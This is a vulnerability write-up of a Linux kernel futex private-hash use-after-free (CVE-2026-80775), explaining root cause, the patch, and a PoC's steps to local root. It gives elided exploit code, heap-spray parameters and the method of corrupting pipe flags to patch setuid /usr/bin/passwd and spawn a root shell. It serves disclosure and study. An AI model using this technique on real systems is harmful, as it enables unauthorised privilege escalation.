<p align="center">
  <img src="../assets/tux.png" width="550" alt="tux">
</p>

# Intro

CVE-2026-80775 is a use-after-free vulnerability in the initial allocation race for the `FUTEX_PRIVATE_HASH` reference counter. If two tasks that share the same `mm` through nested vfork execute concurrently, each can allocate a different per-CPU counter and publish it to the same pointer field. As a result, a live reference is omitted from the count and an active private futex hash is freed.

The public PoC turns this use-after-free into a full local privilege escalation. It attacks a vulnerable Ubuntu 26.04 `7.0.0-30-generic` system from an unprivileged user account and launches a root shell.

This document explains the root cause of the vulnerability and the exploit flow of the Ubuntu PoC.

# Background

The private futex hash is a futex hash table associated with the `mm_struct` shared by a process. A process can set the table size with `prctl(PR_FUTEX_HASH, PR_FUTEX_HASH_SET_SLOTS, slots, 0, 0)`, and private futex operations select a bucket from this table.

The lifetime of a private hash is protected by `fph->state` and per-CPU and atomic counters in the `mm`. A futex operation obtains a reference to the current hash inside an RCU section and then receives a bucket. The bucket must remain usable outside the RCU section for as long as this reference is held.

When the hash size changes, the kernel prepares a new table and waits until the references to the old table reach 0. Once the old table becomes dead, it moves queued waiters to the new table, publishes the new table, and schedules the old table for RCU freeing.

A regular `CLONE_VM` clone allocates the default private hash before two tasks can execute concurrently in the same `mm`. vfork is excluded from this early allocation because the parent waits for the child to exit or execute a new program and is therefore assumed not to run concurrently.

# Root Cause

The vulnerable Ubuntu source excludes vfork from default private hash allocation.

```c
static bool need_futex_hash_allocate_default(u64 clone_flags)
{
	/*
	 * Allocate a default futex hash for any sibling that will
	 * share the parent's mm, except vfork.
	 */
	return (clone_flags & (CLONE_VM | CLONE_VFORK)) == CLONE_VM; // <=[1]
}
```

`[1]` does not create a default hash for the `CLONE_VM | CLONE_VFORK` combination. This is safe for a single vfork because the parent is suspended, but if the intermediate child of a nested vfork is terminated with `SIGKILL`, the outer parent is released from its vfork wait. The grandchild remains alive, allowing the parent and grandchild to execute user space code concurrently in the same `mm`.

When both tasks call `PR_FUTEX_HASH_SET_SLOTS` for the first time, they race in the lockless initialization in `futex_hash_allocate()`.

```c
static int futex_hash_allocate(unsigned int hash_slots, unsigned int flags)
{
	struct mm_struct *mm = current->mm;
	struct futex_private_hash *fph;
	bool custom = flags & FH_CUSTOM;
	int i;

	[...]
	if (!mm->futex_ref) {
		/*
		 * This will always be allocated by the first thread and
		 * therefore requires no locking.
		 */
		mm->futex_ref = alloc_percpu(unsigned int);       // <=[2]
		if (!mm->futex_ref)
			return -ENOMEM;
		this_cpu_inc(*mm->futex_ref); /* 0 -> 1 */
	}

	fph = kvzalloc(struct_size(fph, queues, hash_slots),
		       GFP_KERNEL_ACCOUNT | __GFP_NOWARN);
	[...]
}
```

If both tasks observe `NULL` at `[2]`, each allocates a different per-CPU counter and stores it in `mm->futex_ref`. The later store overwrites the earlier pointer, so the first counter and its reference can no longer be found through the `mm`.

The problem is that the code that obtains and returns references uses the current `mm->futex_ref`, rather than a counter tied to a particular hash.

```c
static bool futex_ref_get(struct futex_private_hash *fph)
{
	struct mm_struct *mm = fph->mm;

	guard(preempt)();

	if (READ_ONCE(fph->state) == FR_PERCPU) {
		__this_cpu_inc(*mm->futex_ref);                  // <=[3]
		return true;
	}

	return atomic_long_inc_not_zero(&mm->futex_atomic);
}

static bool futex_ref_put(struct futex_private_hash *fph)
{
	struct mm_struct *mm = fph->mm;

	guard(preempt)();

	if (READ_ONCE(fph->state) == FR_PERCPU) {
		__this_cpu_dec(*mm->futex_ref);
		return false;
	}

	return atomic_long_dec_and_test(&mm->futex_atomic);
}
```

Both the get at `[3]` and the subsequent put dereference the current pointer. A reference obtained from the old counter can therefore be returned to the new counter after the pointer changes. When the old hash is converted to atomic state, the kernel also sums only the counter addressed by the current pointer.

```c
static void __futex_ref_atomic_end(struct futex_private_hash *fph)
{
	struct mm_struct *mm = fph->mm;
	unsigned int count = 0;
	long ret;
	int cpu;

	[...]
	for_each_possible_cpu(cpu) {
		unsigned int *ptr = per_cpu_ptr(mm->futex_ref, cpu);
		count += *ptr;
		*ptr = 0;
	}

	[...]
	this_cpu_inc(*mm->futex_ref); /* 0 -> 1 */

	[...]
	ret = atomic_long_add_return(count - LONG_MAX - 1, &mm->futex_atomic); // <=[4]
	if (!ret)
		wake_up_var(mm);

	WARN_ON_ONCE(ret < 0);
	mmput_async(mm);
}
```

`[4]` transfers the sum of the collected per-CPU counters into the atomic counter. The reference in the overwritten counter is absent from this sum. In the sequence created by the PoC, the atomic reference of the active old hash becomes `-1`.

The path that obtains an atomic reference treats any value other than 0 as a successful increment.

```c
static bool futex_ref_get(struct futex_private_hash *fph)
{
	struct mm_struct *mm = fph->mm;

	guard(preempt)();

	if (READ_ONCE(fph->state) == FR_PERCPU) {
		__this_cpu_inc(*mm->futex_ref);
		return true;
	}

	return atomic_long_inc_not_zero(&mm->futex_atomic); // <=[5]
}
```

At `[5]`, `-1` is not 0, so the increment succeeds and changes the value to 0. The caller concludes that it obtained a reference to the old hash and receives a bucket pointer. At the same time, another caller observes 0 as the dead state and pivots to the new hash.

```c
static bool __futex_pivot_hash(struct mm_struct *mm,
			       struct futex_private_hash *new)
{
	struct futex_private_hash *fph;

	[...]
	fph = rcu_dereference_protected(mm->futex_phash,
					lockdep_is_held(&mm->futex_hash_lock));
	if (fph) {
		if (!futex_ref_is_dead(fph)) {
			mm->futex_phash_new = new;
			return false;
		}

		futex_rehash_private(fph, new);
	}
	new->state = FR_PERCPU;
	scoped_guard(rcu) {
		mm->futex_batches = get_state_synchronize_rcu();
		rcu_assign_pointer(mm->futex_phash, new);
	}
	kvfree_rcu(fph, rcu);
	return true;
}
```

The old hash is passed to `kvfree_rcu()` and freed after an RCU grace period, while the bucket pointer obtained earlier remains in use.

This pointer is used again outside the RCU section in `futex_q_lock()`.

```c
void futex_q_lock(struct futex_q *q, struct futex_hash_bucket *hb)
	__acquires(&hb->lock)
{
	[...]
	futex_hb_waiters_inc(hb); /* implies smp_mb(); (A) */

	q->lock_ptr = &hb->lock;

	spin_lock(&hb->lock);
}
```

The use-after-free occurs when the waiter count and lock state are written into a bucket of the prematurely freed private hash.

# Exploit

The PoC uses the reference race to replace an old hash with 8 slots too early while a PI futex waiter continues to point to its bucket. It then reclaims the freed hash with a pipe ring containing 16 entries and turns the decrement operation on a waiter count, which is 32 bits wide, during stale waiter cleanup into a modification of `pipe_buffer` flags. The corrupted flag is used to merge a privilege escalation stub into the page cache of `/usr/bin/passwd`.

In the BTF of the target Ubuntu kernel, the fixed header of `struct futex_private_hash` is 64 bytes, as is each `struct futex_hash_bucket`. A hash with 8 slots is 576 bytes, and the `waiters` field in its first bucket lies at object offset 64. `struct pipe_buffer` is 40 bytes and its `flags` field is at offset 24, so the `flags` field in the second entry of a ring with 16 entries is also at ring offset 64.

## 1. Creating a negative reference state with nested vfork

The PoC creates an intermediate child with `CLONE_VM | CLONE_VFORK`, and the intermediate child creates a grandchild with the same flags. The grandchild sends `SIGKILL` only to the intermediate child to wake the outer parent.

```c
void vfork_bridge_entry(void)
{
	struct clone_args_local args = { 0 };
	long ret;

	[...]
	args.flags = CLONE_VM_LOCAL | CLONE_VFORK_LOCAL;
	args.exit_signal = SIGCHLD;
	args.stack = (uint64_t)(uintptr_t)hash_resize_stack;
	args.stack_size = STACK_SIZE;
	ret = raw_clone3_hash_resize(&args, sizeof(args));
	(void)ret;
	raw_exit(24);
}

[...]
void hash_resize_entry(void)
{
	[...]
	ret = raw_syscall2(SYS_KILL_X86_64, vfork_bridge_pid, SIGKILL);
	if (ret < 0)
		raw_exit(21);
	[...]
	ret = raw_syscall5(SYS_PRCTL_X86_64, PR_FUTEX_HASH_LOCAL,
			   PR_FUTEX_HASH_SET_SLOTS_LOCAL, RESIZE_HASH_SLOTS, 0,
			   0);
	[...]
}

[...]
	args.flags = CLONE_VM_LOCAL | CLONE_VFORK_LOCAL;
	args.exit_signal = SIGCHLD;
	args.stack = (uint64_t)(uintptr_t)vfork_bridge_stack.usable;
	args.stack_size = STACK_SIZE;
	vfork_bridge_pid = raw_clone3_vfork_bridge(&args, sizeof(args)); // <=[6]
	[...]
```

`[6]` starts the outer vfork, and the intermediate child immediately starts the second vfork. When the grandchild terminates the intermediate child, the outer parent and grandchild execute together in the same `mm`, with no default private hash having been allocated for either task.

The parent requests 8 slots and the grandchild requests 262,144 slots, racing the initial allocation of `mm->futex_ref`. The PoC uses a slow `io_setup()` call from a worker that creates up to 60,000 AIO contexts as a timing gate. It also uses cleanup of a robust list with 2,048 nodes to preserve the get and put ordering of the old hash reference. After the first counter is overwritten, the PoC converts the old hash to atomic state and creates a `-1` reference.

## 2. Leaving a PI futex in the old hash

The target waits on a PI futex while the controller owns it. At the moment the hash lookup by the target changes the old hash reference from `-1` to 0, the selector looks up another private futex. The selector interprets the old hash as dead and publishes the new hash with 262,144 slots.

```c
	[...]
	selector_result =
		futex_race_futex_call(words->selector, FUTEX_WAKE_PRIVATE, 1);
	[...]
	slots_after = futex_race_get_slots();
	atomic_store_explicit(&shared->slots_after, slots_after,
			      memory_order_release);

	[...]
	if (slots_after == FUTEX_RACE_EXPANDED_HASH_SLOTS) { // <=[7]
		if (futex_race_verify_late_queue(shared, &session, words,
					 generation) != 0)
			abort_attempt(ATTEMPT_UNSAFE, "late queue ambiguous");
		if (pipe_bank_publish(shared, generation, session.target_pid) !=
		    0)
			abort_attempt(ATTEMPT_UNSAFE, "publish failed");
		finish_attempt();
	}
	[...]
```

`[7]` advances only generations where the selector pivoted to the new hash. The PoC also verifies that the controller immediately receives `-EDEADLK` when it attempts to lock the PI futex owned by the target, that waking the old owner futex in the new hash returns 0, and that the target has not yet returned. Together, these conditions identify the state where only the PI waiter of the target entered a bucket in the old hash late.

The old hash has already been passed to `kvfree_rcu()` but has not yet been physically freed. At this point the target is queued in the old bucket and stores the lock address in `q->lock_ptr`. This pointer does not change when RCU later frees the old hash and a pipe ring reclaims the same allocation.

## 3. Reclaiming the freed hash with a pipe ring

On the same CPU, the PoC creates hashes with 8 slots in 11 separate `mm` instances and replaces them with hashes that have 16 slots. The old target hash and the 11 dummy hashes fill an RCU free sheaf that holds 12 objects in the target `kmalloc-cg-1k` cache, causing them to reach the actual free path.

At the same time, four workers prepare 16 pipes per worker in each of 15 waves. The capacities of the resulting 960 pipes are reduced to 8,192 bytes and then expanded to 65,536 bytes to allocate fresh rings with 16 entries.

```c
int pipe_resize_ring(struct pipe_inode_info *pipe, unsigned int nr_slots)
{
	struct pipe_buffer *bufs;
	unsigned int head, tail, mask, n;

	[...]
	bufs = kzalloc_objs(*bufs, nr_slots, GFP_KERNEL_ACCOUNT | __GFP_NOWARN); // <=[8]
	if (unlikely(!bufs))
		return -ENOMEM;
	[...]
}
```

`[8]` allocates the new pipe ring with all bytes initialized to 0. A hash with 8 slots occupies `64 + 8 × 64 = 576` bytes, while a ring with 16 entries occupies `16 × 40 = 640` bytes, placing both in `kmalloc-cg-1k`. After successful reclamation, `queues[0].waiters` in the old hash and `pipe_buffer[1].flags` occupy exactly the same address.

One byte from immediately before the ELF entry of `/usr/bin/passwd` is transferred into each pipe through `splice()`. The second `pipe_buffer` therefore points to the page cache page of the executable being modified, and the next pipe write position is exactly the ELF entry.

## 4. Overwriting a setuid file through pipe flags

After the pipe spray completes, the PoC sends `SIGKILL` to the target through a pidfd. The interrupted PI futex path follows the stale address in `q->lock_ptr` during cleanup. Among several stale accesses, the operation used by the exploit is the waiter decrement in `__futex_unqueue()`.

```c
void __futex_unqueue(struct futex_q *q)
{
	struct futex_hash_bucket *hb;

	if (WARN_ON_SMP(!q->lock_ptr) || WARN_ON(plist_node_empty(&q->list)))
		return;
	lockdep_assert_held(q->lock_ptr);

	hb = container_of(q->lock_ptr, struct futex_hash_bucket, lock);
	plist_del(&q->list, &hb->chain);
	futex_hb_waiters_dec(hb);                         // <=[9]
}
```

`[9]` performs a decrement on all 32 bits of `pipe_buffer[1].flags`, changing its initial value of 0 to `UINT_MAX`. This value includes `PIPE_BUF_FLAG_CAN_MERGE`. The normal pipe write path then checks this flag and copies new data into the page referenced by the existing buffer.

```c
	[...]
	chars = total_len & (PAGE_SIZE-1);
	if (chars && !was_empty) {
		struct pipe_buffer *buf = pipe_buf(pipe, head - 1);
		int offset = buf->offset + buf->len;

		if ((buf->flags & PIPE_BUF_FLAG_CAN_MERGE) && // <=[10]
		    offset + chars <= PAGE_SIZE) {
			ret = pipe_buf_confirm(pipe, buf);
			if (ret)
				goto out;

			ret = copy_page_from_iter(buf->page, offset, chars, from);
			[...]
			buf->len += ret;
			if (!iov_iter_count(from))
				goto out;
		}
	}
	[...]
```

The write that passes `[10]` merges data into the `/usr/bin/passwd` page referenced by the spliced buffer. The PoC first writes 16 bytes to every pipe and confirms that the SHA-256 of the entire file exactly matches the expected intermediate state. It then writes the remaining 100 bytes and verifies the full file hash again after installing the final stub, which spans 116 bytes.

This operation does not require a separate pipe vulnerability. The private futex hash use-after-free creates `CAN_MERGE`, and the normal pipe write path consumes that flag.

## 5. Restoring the file and launching a root shell

Before setting `no_new_privs` in the rest of the exploit process tree, the PoC forks a separate child that will execute the final payload. That child therefore retains `no_new_privs = 0`, while the parent and race workers have `no_new_privs = 1`.

After the final SHA-256 of the target file is confirmed, that child executes the patched setuid `/usr/bin/passwd` using the file descriptor reserved at startup.

```c
	[...]
	if (payload_handoff_nnp_is(0) != 0 ||
	    payload_handoff_capture_ids(&ids) != 0 ||
	    !payload_handoff_ids_are_start(&ids) ||
	    payload_handoff_fixed_fds_ok() != 0 ||
	    payload_handoff_require_fixed_identities(&record) != 0 ||
	    payload_handoff_verify_target_hash(PAYLOAD_HANDOFF_FD_TARGET,
					       TARGET_FULLY_PATCHED) != 0)
		payload_handoff_effect_fail(shared, 103);
	(void)syscall(SYS_execveat, PAYLOAD_HANDOFF_FD_TARGET, "", target_argv,
		      target_envp, AT_EMPTY_PATH);               // <=[11]
	[...]
```

`[11]` executes the verified target FD without resolving its path again. After the setuid transition, the stub at the ELF entry invokes `setresgid(0, 0, 0)` and `setresuid(0, 0, 0)`, then uses `execveat()` to execute the PoC itself again from FD 198.

The PoC, now running as root, verifies the sealed record and the identities of the reserved file descriptors before restoring the original 116 bytes of `/usr/bin/passwd`.

```c
	[...]
	if (payload_handoff_verify_target_hash(PAYLOAD_HANDOFF_FD_TARGET,
					       TARGET_FULLY_PATCHED) != 0 ||
	    close(PAYLOAD_HANDOFF_FD_TARGET) != 0)
		payload_handoff_root_fail(202);
	fd = openat(PAYLOAD_HANDOFF_FD_BIN_DIR, payload_handoff_target_path,
		    O_WRONLY | O_NOFOLLOW | O_CLOEXEC);
	if (fd < 0 ||
	    payload_handoff_target_metadata_fd(
		    fd, &record.fd[PAYLOAD_HANDOFF_FD_TARGET -
				   PAYLOAD_HANDOFF_FIRST_FIXED_FD]) != 0 ||
	    payload_handoff_write_exact_at(fd, record.original_entry,
					   PAYLOAD_STUB_BYTES,
					   payload_handoff_patch_offset) != 0 ||
	    fchmod(fd, 04755) != 0 || fsync(fd) != 0 || close(fd) != 0)
		payload_handoff_root_fail(203);
	[...]
	if (fd < 0 ||
	    payload_handoff_target_metadata_fd(
		    fd, &record.fd[PAYLOAD_HANDOFF_FD_TARGET -
				   PAYLOAD_HANDOFF_FIRST_FIXED_FD]) != 0 ||
	    payload_handoff_verify_target_hash(
		    fd, PAYLOAD_HANDOFF_TARGET_ORIGINAL) != 0 ||
	    close(fd) != 0)
		payload_handoff_root_fail(204);

	[...]
	(void)execve("/bin/bash", shell_argv, shell_envp);
	(void)execve("/bin/sh", shell_argv, shell_envp);
	[...]
```

After restoration, it verifies that the SHA-256 of the entire file matches the original and closes every reserved file descriptor. Finally, it launches `/bin/bash` while preserving the standard streams of the caller.

# Patch

This vulnerability was fixed by upstream commit `bde023808364`. In the upstream source at the time of the patch, the same state had been reorganized under `mm->futex.phash.ref`, so the field name below differs from `mm->futex_ref` in the vulnerable Ubuntu source.

The essential change in the upstream patch is shown below.

```diff
diff --git a/kernel/futex/core.c b/kernel/futex/core.c
--- a/kernel/futex/core.c
+++ b/kernel/futex/core.c
@@ -1857,14 +1857,18 @@ static int futex_hash_allocate(unsigned int hash_slots, unsigned int flags)
 	}
 
 	if (!mm->futex.phash.ref) {
+		unsigned int __percpu *ref = alloc_percpu(unsigned int);
+
+		if (!ref)
+			return -ENOMEM;
+
 		/*
-		 * This will always be allocated by the first thread and
-		 * therefore requires no locking.
+		 * Tasks sharing the mm can run this concurrently, so take the
+		 * initial reference before publishing the counter.
 		 */
-		mm->futex.phash.ref = alloc_percpu(unsigned int);
-		if (!mm->futex.phash.ref)
-			return -ENOMEM;
-		this_cpu_inc(*mm->futex.phash.ref); /* 0 -> 1 */
+		this_cpu_inc(*ref); /* 0 -> 1 */
+		if (cmpxchg(&mm->futex.phash.ref, NULL, ref))
+			free_percpu(ref);
 	}
 
 	fph = kvzalloc(struct_size(fph, queues, hash_slots),
```

The new counter is allocated into a local variable and takes its initial reference before publication. `cmpxchg()` publishes only one counter when the pointer is `NULL`, while the task that loses the race frees its own allocation with `free_percpu()`. The counter pointer therefore cannot be overwritten, and the reference of an old hash cannot disappear during the fold.
